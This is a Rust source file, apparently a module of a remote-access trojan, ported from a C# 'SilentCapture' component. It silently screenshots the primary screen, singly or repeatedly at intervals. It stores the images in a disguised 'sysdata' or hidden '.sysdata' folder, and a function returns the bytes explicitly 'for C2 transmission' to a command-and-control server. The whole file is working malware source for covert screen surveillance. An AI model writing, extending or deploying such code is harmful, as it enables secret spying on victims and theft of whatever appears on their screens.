// shot.rs — Rust port of shot.cs (SilentCapture)
// Takes screenshots silently and returns the file path.
// Uses cross-platform screen capture via the `screenshots` crate.

use std::fs;
use std::path::PathBuf;
use chrono::Local;
use log::{info, warn};

pub struct SilentCapture;

impl SilentCapture {
    /// Takes a screenshot and returns the file path.
    pub fn capture_screen() -> Option<String> {
        let output_dir = get_output_dir();
        let _ = fs::create_dir_all(&output_dir);

        match screenshots::Screen::all() {
            Ok(screens) => {
                if screens.is_empty() {
                    warn!("[-] No screens available");
                    return None;
                }

                let screen = &screens[0]; // Primary screen

                match screen.capture() {
                    Ok(capture) => {
                        let file_name = format!(
                            "shot_{}.png",
                            Local::now().format("%Y%m%d_%H%M%S")
                        );
                        let file_path = output_dir.join(&file_name);

                        // Convert the capture to an image and save as PNG
                        let width = capture.width();
                        let height = capture.height();
                        let rgba_data = capture.into_raw();

                        match image::RgbaImage::from_raw(width, height, rgba_data) {
                            Some(img) => {
                                match img.save(&file_path) {
                                    Ok(_) => {
                                        info!("[+] Screenshot saved: {}", file_path.display());
                                        Some(file_path.to_string_lossy().to_string())
                                    }
                                    Err(e) => {
                                        warn!("[-] Save error: {}", e);
                                        None
                                    }
                                }
                            }
                            None => {
                                warn!("[-] Failed to create image from capture data");
                                None
                            }
                        }
                    }
                    Err(e) => {
                        warn!("[-] Screen capture failed: {}", e);
                        None
                    }
                }
            }
            Err(e) => {
                warn!("[-] Screen enumeration failed: {}", e);
                None
            }
        }
    }

    /// Takes multiple screenshots at intervals.
    /// Returns list of file paths.
    pub async fn capture_multiple(count: usize, interval_ms: u64) -> Vec<String> {
        let mut files = Vec::new();

        for i in 0..count {
            if let Some(path) = Self::capture_screen() {
                files.push(path);
            }
            if i < count - 1 {
                tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
            }
        }

        files
    }

    /// Takes a screenshot and returns the raw PNG bytes (for C2 transmission).
    pub fn capture_to_bytes() -> Option<Vec<u8>> {
        let path = Self::capture_screen()?;
        fs::read(&path).ok()
    }
}

/// Returns the output directory for screenshots.
fn get_output_dir() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA")
            .unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().to_string());
        PathBuf::from(local).join("sysdata")
    }
    #[cfg(not(target_os = "windows"))]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(".sysdata")
    }
}
